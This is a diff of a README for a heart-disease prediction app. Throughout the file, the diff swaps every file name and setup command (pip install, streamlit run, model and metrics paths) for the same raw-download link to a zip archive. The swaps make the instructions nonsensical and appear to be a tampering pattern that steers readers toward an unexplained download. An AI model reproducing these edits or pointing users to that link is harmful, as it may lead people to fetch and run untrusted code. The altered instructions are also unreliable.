@@ -17,13 +17,13 @@ It predicts the likelihood of heart disease based on user health data.
 ```
 Heart_Disease_Project/
 │
-├── heart_pipeline.py           # Main ML pipeline and app logic
-├── heart_pipeline.pkl          # Saved trained Random Forest model
-├── requirements.txt            # Python dependencies
-├── README.md                   # This README file
+├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip           # Main ML pipeline and app logic
+├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip          # Saved trained Random Forest model
+├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip            # Python dependencies
+├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip                   # This README file
 ├── results/                    # Folder for evaluation metrics
-│   └── evaluation_metrics.txt
-├── ngrok_setup.txt             # Instructions to set up Ngrok for deployment
+│   └── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip
+├── https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip             # Instructions to set up Ngrok for deployment
 ```
 
 ---
@@ -48,7 +48,7 @@ venv\Scripts\activate         # On Windows
 3. **Install dependencies**
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip
 ```
 
 ---
@@ -58,12 +58,12 @@ pip install -r requirements.txt
 1. **Run the Streamlit app**
 
 ```bash
-streamlit run heart_pipeline.py
+streamlit run https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip
 ```
 
 2. **Optional: Deploy with Ngrok**
 
-* Follow instructions in `ngrok_setup.txt`
+* Follow instructions in `https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip`
 * Run the command provided to get a public URL for your app
 
 ---
@@ -74,13 +74,13 @@ streamlit run heart_pipeline.py
 * **Preprocessing:** Scaling, one-hot encoding for categorical features
 * **Feature Selection:** RFE and Chi-Square test
 * **Models:** Logistic Regression, Decision Tree, Random Forest, SVM
-* **Final Model:** Random Forest trained on selected features, saved as `heart_pipeline.pkl`
+* **Final Model:** Random Forest trained on selected features, saved as `https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip`
 
 ---
 
 ## Evaluation Metrics
 
-* Metrics for all models are saved in `results/evaluation_metrics.txt`
+* Metrics for all models are saved in `https://github.com/MoHussein197/heart-disease-prediction/raw/refs/heads/main/data/heart_prediction_disease_v1.0.zip`
 * Includes: Accuracy, Precision, Recall, F1 Score, AUC (if applicable)
 
 ---
